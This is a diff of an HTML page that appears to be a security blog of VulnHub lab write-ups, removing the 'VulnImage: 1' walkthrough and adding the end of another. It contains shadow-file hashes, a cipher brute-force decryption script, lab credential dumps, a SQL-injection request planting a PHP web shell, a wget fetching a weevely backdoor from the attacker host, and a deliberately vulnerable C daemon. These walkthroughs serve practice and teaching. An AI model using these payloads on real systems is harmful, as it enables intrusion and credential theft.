+</span><span class='line'>shutdown:*:9797:0:::::
+</span><span class='line'>halt:*:9797:0:::::
+</span><span class='line'>mail:*:9797:0:::::
+</span><span class='line'>news:*:9797:0:::::
+</span><span class='line'>uucp:*:9797:0:::::
+</span><span class='line'>operator:*:9797:0:::::
+</span><span class='line'>games:*:9797:0:::::
+</span><span class='line'>ftp:*:9797:0:::::
+</span><span class='line'>smmsp:*:9797:0:::::
+</span><span class='line'>mysql:*:9797:0:::::
+</span><span class='line'>rpc:*:9797:0:::::
+</span><span class='line'>sshd:*:9797:0:::::
+</span><span class='line'>gdm:*:9797:0:::::
+</span><span class='line'>pop:*:9797:0:::::
+</span><span class='line'>nobody:*:9797:0:::::
+</span><span class='line'>sysadmin:$1$Nj4nHA2G$JbByYpmcxsXEiWAUObt1n0:13550:0:99999:7:::
+</span><span class='line'>csadmin:$1$fL53QS96$x94h96zABA9MrbISq7VtZ1:13550:0:99999:7:::
+</span><span class='line'>sdadmin:$1$hL8T9Cgk$0g4u8UgtkMn11OJ7sjsK00:13550:0:99999:7:::
+</span><span class='line'>dbadmin:$1$dQwfzffm$kIXUGVFu3XZmm4jZNp6wa1:13550:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because we are in wheel group, we can invoke the command &lsquo;su&rsquo; directly to obtain the root access:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sysadmin@slax:~$ id
+</span><span class='line'>uid=1000(sysadmin) gid=10(wheel) groups=10(wheel)
+</span><span class='line'>sysadmin@slax:~$ su
+</span><span class='line'>Password: *********
+</span><span class='line'>root@slax:/home/sysadmin#</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the home directory of sysadmin user, we locate the encrypted file in ftp and use
+script for decryption, with the password of the root user:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:~# cat /home/sysadmin/Note_to_self 
+</span><span class='line'>Note:
+</span><span class='line'>useracc_update.csv file has been moved to the ftp server and encrypted 
+</span><span class='line'>for transfer to dbadmin's account.  These are only the updated values 
+</span><span class='line'>for reference in the database.  
+</span><span class='line'>We need to tailor to our new customers for the New Year!</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/ftp/incoming# cat crack-openssl.sh
+</span><span class='line'><span class="c">#!/usr/bin/env bash</span>
+</span><span class='line'>
+</span><span class='line'>mkdir csv
+</span><span class='line'><span class="nv">ciphers</span><span class="o">=</span><span class="sb">`</span>openssl list-cipher-commands<span class="sb">`</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> c in <span class="nv">$ciphers</span><span class="p">;</span> <span class="k">do</span>
+</span><span class='line'>  openssl enc -d -<span class="s2">&quot;$c&quot;</span> -in useracc_update.csv.enc -k <span class="s2">&quot;31/Fwxw+2&quot;</span> -out csv/useracc_update.csv.<span class="nv">$c</span>-decrypted 2&gt;/dev/ull
+</span><span class='line'><span class="k">done</span>
+</span><span class='line'>strings -n <span class="m">12</span> csv/*
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/ftp/incoming# ./crack-openssl.sh   
+</span><span class='line'>ID,Last,First,Email,State,Username,Password,Verifacation Code,Pin code
+</span><span class='line'>1000,Carr,Alfred,acarr23@gmail.com,NY,acarr9096,phantom4,952733,490
+</span><span class='line'>1001,Karson,William,wkarson53@yahoo.com,NY,wkarson2431,rockallday123,567094,345
+</span><span class='line'>1002,Wheeler,Cordy,megawheels98@rocketmail.com,NY,cwheeler5031,goeagles90,462724,631
+</span><span class='line'>1003,Smith,Ken,synthesizer_1r@gmail.com,NY,ksmith6253,crystalization,636721,353
+</span><span class='line'>1004,Quinn,Cynthia,qcq92@aol.com,NY,cquinn1217,archyandhenry,680247,223
+</span><span class='line'>1005,Floyd,Wilson,jukeboxer_4life@gmail.com,NY,wfloyd5931,knockout66,521456,441
+</span><span class='line'>1006,Blake,Markus,sil3nt_gunn3r@yahoo.com,NY,mblake6947,268768924,129632,557
+</span><span class='line'>1007,Nash,Jillian,wiselife141@aol.com,NY,jnash0934,checkitout1,324672,315
+</span><span class='line'>1008,Atkins,Alison,double_a44@hotmail.com,NY,aatkins9087,gogogo123123,457094,124
+</span><span class='line'>1009,Oliver,Frank,fog_of_war0001@gmail.com,NY,foliver9385,falconpunch,783143,134
+</span><span class='line'>1010,Jones,Edith,msjones677@hotmail.com,NY,ejones7532,chris12345,632620,579
+</span><span class='line'>1011,Moore,Cody,aiprojectx@gmail.com,NY,dot_Cipher,crypTrace,101010,1337</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1277,769 +2150,6 @@ mysql database:</p>
 </span><span class='line'>john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
 </span><span class='line'>harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
 </span><span class='line'>sh-3.00#</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/10/vulnimage-1/">VulnImage: 1</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-10T15:18:05+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:18 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/vulnimage-1,39/">VulnImage: 1</a></p>
-
-<p>Nmap output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE     VERSION
-</span><span class='line'>22/tcp   open  ssh         OpenSSH 5.1p1 Debian 5 (protocol 2.0)
-</span><span class='line'>25/tcp   open  smtp        Exim smtpd 4.50
-</span><span class='line'>80/tcp   open  http        Apache httpd 2.2.9 ((Debian) PHP/5.2.6-1+lenny9 with Suhosin-Patch)
-</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>3306/tcp open  mysql       MySQL 5.0.51a-24+lenny4
-</span><span class='line'>7777/tcp open  cbt?</span></code></pre></td></tr></table></div></figure>
-
-
-<p>With dirb we found a few interesting directories (repo, admin, profiles),
-directory listing is enabled:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>---- Scanning URL: http://192.168.80.143/ ----
-</span><span class='line'>+ http://192.168.80.143/index (CODE:200|SIZE:71)    
-</span><span class='line'>+ http://192.168.80.143/view (CODE:200|SIZE:166)    
-</span><span class='line'>==> DIRECTORY: http://192.168.80.143/admin/    
-</span><span class='line'>==> DIRECTORY: http://192.168.80.143/profiles/    
-</span><span class='line'>==> DIRECTORY: http://192.168.80.143/repo/    
-</span><span class='line'>+ http://192.168.80.143/myblog (CODE:200|SIZE:736)    
-</span><span class='line'>+ http://192.168.80.143/server-status (CODE:403|SIZE:332)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Submitting the quote gives an error SQL message:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.143/admin/profile.php
-</span><span class='line'>Username: '
-</span><span class='line'>Password a
-</span><span class='line'>
-</span><span class='line'>... 
-</span><span class='line'>SELECT * FROM blog_users WHERE poster = ''' AND password = 'a'</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After a few minutes of playing with requests we realize that we can create
-files in format &lsquo;username-fname&rsquo; and with the content of &lsquo;sig&rsquo; parameter.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /admin/profile.php HTTP/1.1
-</span><span class='line'>Host: 192.168.80.143
-</span><span class='line'>User-Agent: Mozilla/5.0
-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-</span><span class='line'>Accept-Language: en-US,en;q=0.5
-</span><span class='line'>Accept-Encoding: gzip, deflate
-</span><span class='line'>DNT: 1
-</span><span class='line'>Referer: http://192.168.80.143/admin/profile.php
-</span><span class='line'>Connection: keep-alive
-</span><span class='line'>Cache-Control: max-age=0
-</span><span class='line'>Content-Type: application/x-www-form-urlencoded
-</span><span class='line'>Content-Length: 104
-</span><span class='line'>
-</span><span class='line'>username=testa&password=test' or '2'='2&sig=&lt;?php system($_REQUEST['cmd']); ?>&fname=x.php&submit=Submit</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now we have a simple PHP shell:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.143/profiles/testa-x.php?cmd=id
-</span><span class='line'>
-</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We download the weevely.php from our server and connect:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.143/profiles/testa-x.php?cmd=wget 192.168.80.137/weevely.php.txt -O c.php
-</span><span class='line'>root@kali32:~# weevely http://192.168.80.143/profiles/c.php 1234</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In the repo directory, we examine the buffd.c. It is a vulnerable daemon,
-listening on port 7777.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-<span class='line-number'>108</span>
-<span class='line-number'>109</span>
-<span class='line-number'>110</span>
-<span class='line-number'>111</span>
-<span class='line-number'>112</span>
-<span class='line-number'>113</span>
-<span class='line-number'>114</span>
-<span class='line-number'>115</span>
-<span class='line-number'>116</span>
-<span class='line-number'>117</span>
-<span class='line-number'>118</span>
-<span class='line-number'>119</span>
-<span class='line-number'>120</span>
-<span class='line-number'>121</span>
-<span class='line-number'>122</span>
-<span class='line-number'>123</span>
-<span class='line-number'>124</span>
-<span class='line-number'>125</span>
-<span class='line-number'>126</span>
-<span class='line-number'>127</span>
-<span class='line-number'>128</span>
-<span class='line-number'>129</span>
-<span class='line-number'>130</span>
-<span class='line-number'>131</span>
-<span class='line-number'>132</span>
-<span class='line-number'>133</span>
-<span class='line-number'>134</span>
-<span class='line-number'>135</span>
-<span class='line-number'>136</span>
-<span class='line-number'>137</span>
-<span class='line-number'>138</span>
-<span class='line-number'>139</span>
-<span class='line-number'>140</span>
-<span class='line-number'>141</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">debian</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">repo</span><span class="o">/</span><span class="n">buffd</span><span class="p">.</span><span class="n">c</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;netdb.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;arpa/inet.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/wait.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;signal.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#define PORT &quot;7777&quot; </span><span class="c1">// the port users will be connecting to</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#define BACKLOG 10       </span><span class="c1">// how many pending connections queue will hold</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="n">vulnerable</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">net_buffer</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="kt">char</span> <span class="n">local_buffer</span><span class="p">[</span><span class="mi">120</span><span class="p">];</span>
-</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">local_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
-</span><span class='line'><span class="k">return</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="n">sigchld_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WNOHANG</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">// get sockaddr, IPv4 or IPv6:</span>
-</span><span class='line'><span class="kt">void</span> <span class="o">*</span><span class="n">get_in_addr</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">sa</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sa</span><span class="o">-&gt;</span><span class="n">sa_family</span> <span class="o">==</span> <span class="n">AF_INET</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="k">return</span> <span class="o">&amp;</span><span class="p">(((</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin_addr</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">return</span> <span class="o">&amp;</span><span class="p">(((</span><span class="k">struct</span> <span class="n">sockaddr_in6</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin6_addr</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">new_fd</span><span class="p">;</span> <span class="c1">// listen on sock_fd, new connection on new_fd</span>
-</span><span class='line'><span class="k">struct</span> <span class="n">addrinfo</span> <span class="n">hints</span><span class="p">,</span> <span class="o">*</span><span class="n">servinfo</span><span class="p">,</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
-</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr_storage</span> <span class="n">their_addr</span><span class="p">;</span> <span class="c1">// connector&#39;s address information</span>
-</span><span class='line'><span class="kt">socklen_t</span> <span class="n">sin_size</span><span class="p">;</span>
-</span><span class='line'><span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">;</span>
-</span><span class='line'><span class="kt">int</span> <span class="n">yes</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
-</span><span class='line'><span class="kt">char</span> <span class="n">in_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">out_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">net_buffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
-</span><span class='line'><span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="n">INET6_ADDRSTRLEN</span><span class="p">];</span>
-</span><span class='line'><span class="kt">int</span> <span class="n">rv</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">hints</span><span class="p">);</span>
-</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
-</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
-</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_flags</span> <span class="o">=</span> <span class="n">AI_PASSIVE</span><span class="p">;</span> <span class="c1">// use my IP</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">((</span><span class="n">rv</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">servinfo</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;getaddrinfo: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">gai_strerror</span><span class="p">(</span><span class="n">rv</span><span class="p">));</span>
-</span><span class='line'><span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">// loop through all the results and bind to the first we can</span>
-</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">servinfo</span><span class="p">;</span> <span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="k">if</span> <span class="p">((</span><span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span>
-</span><span class='line'><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;server: socket&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="k">continue</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">yes</span><span class="p">,</span>
-</span><span class='line'><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;setsockopt&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;server: bind&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="k">continue</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">break</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;server: failed to bind</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">servinfo</span><span class="p">);</span> <span class="c1">// all done with this structure</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">BACKLOG</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;listen&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">sigchld_handler</span><span class="p">;</span> <span class="c1">// reap all dead processes</span>
-</span><span class='line'><span class="n">sigemptyset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
-</span><span class='line'><span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;sigaction&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;server: waiting for connections...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// main accept() loop</span>
-</span><span class='line'><span class="n">sin_size</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">their_addr</span><span class="p">;</span>
